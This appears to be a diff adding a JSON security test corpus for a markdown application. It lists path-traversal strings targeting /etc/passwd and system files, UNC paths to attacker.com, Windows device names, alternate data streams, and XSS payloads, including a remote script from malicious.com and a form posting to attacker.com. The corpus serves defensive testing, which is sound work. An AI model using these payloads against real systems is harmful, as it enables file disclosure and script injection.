@@ -1,0 +1,50 @@
+{
+  "description": "MarkYourDown Security Test Corpus (Chapter 8 & Spike S4)",
+  "pathTraversal": [
+    "../../../../windows/system32/calc.exe",
+    "..\\..\\..\\windows\\system32\\calc.exe",
+    "/etc/shadow",
+    "/etc/passwd",
+    "C:/Windows/System32/cmd.exe",
+    "..%2f..%2f..%2fwindows%2fsystem32%2fcalc.exe",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  ],
+  "uncPaths": [
+    "\\\\192.168.1.100\\share\\exploit.png",
+    "\\\\attacker.com\\payload.md",
+    "\\\\?\\C:\\Windows\\System32\\notepad.exe",
+    "\\\\.\\COM1"
+  ],
+  "deviceNames": [
+    "CON",
+    "PRN",
+    "AUX",
+    "NUL",
+    "COM1",
+    "COM2",
+    "COM9",
+    "LPT1",
+    "LPT9",
+    "CON.txt",
+    "NUL.md",
+    "aux.markdown"
+  ],
+  "alternateDataStreams": [
+    "document.md:hidden_executable.exe",
+    "notes.md:stream_data",
+    "test.txt::$DATA"
+  ],
+  "xssPayloads": [
+    "<script>window.__wails_exploit = true;</script>",
+    "<script src=\"http://malicious.com/evil.js\"></script>",
+    "<img src=\"invalid-image\" onerror=\"alert('XSS')\">",
+    "<svg onload=\"alert('SVG XSS')\"><circle r=\"10\"/></svg>",
+    "<a href=\"javascript:alert('JS protocol')\">Click here</a>",
+    "<iframe src=\"https://example.com/exploit\"></iframe>",
+    "<object data=\"malicious.swf\"></object>",
+    "<embed src=\"malicious.pdf\"></embed>",
+    "<details open ontoggle=\"alert(1)\">test</details>",
+    "<body onload=\"alert('body xss')\">",
+    "<form action=\"http://attacker.com\"><input type=\"submit\"></form>"
+  ]
+}
